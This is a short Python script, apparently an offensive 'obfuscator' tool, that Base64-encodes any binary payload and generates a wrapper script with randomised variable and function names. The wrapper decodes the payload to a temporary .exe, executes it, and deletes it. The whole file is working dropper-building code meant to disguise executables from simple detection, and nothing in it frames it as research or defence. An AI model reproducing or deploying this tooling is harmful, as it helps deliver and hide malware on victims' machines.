#!/usr/bin/env python3

import base64
import os
import sys
import random
import string

def generate_random_string(length=10):
    """Generate random string for variable names"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def base64_encode_payload(payload_file):
    """Encode payload using Base64"""
    try:
        with open(payload_file, 'rb') as f:
            payload_data = f.read()
        
        encoded_payload = base64.b64encode(payload_data).decode('utf-8')
        return encoded_payload
    except FileNotFoundError:
        print(f"Error: File {payload_file} not found")
        return None

def create_obfuscated_script(encoded_payload, output_file):
    """Create obfuscated Python script"""
    var1 = generate_random_string()
    var2 = generate_random_string()
    var3 = generate_random_string()
    
    script_template = f'''#!/usr/bin/env python3
import base64
import subprocess
import tempfile
import os

def {generate_random_string()}():
    {var1} = "{encoded_payload}"
    {var2} = base64.b64decode({var1})
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as {var3}:
        {var3}.write({var2})
        temp_path = {var3}.name
    
    try:
        subprocess.run([temp_path], check=True)
    finally:
        os.unlink(temp_path)

if __name__ == "__main__":
    {generate_random_string()}()
'''
    
    with open(output_file, 'w') as f:
        f.write(script_template)
    
    print(f"Obfuscated script created: {output_file}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 obfuscator.py <payload_file> <output_file>")
        sys.exit(1)
    
    payload_file = sys.argv[1]
    output_file = sys.argv[2]
    
    print(f"Encoding payload: {payload_file}")
    encoded_payload = base64_encode_payload(payload_file)
    
    if encoded_payload:
        create_obfuscated_script(encoded_payload, output_file)
        print("Obfuscation complete!")
    else:
        print("Failed to encode payload")

if __name__ == "__main__":
    main()
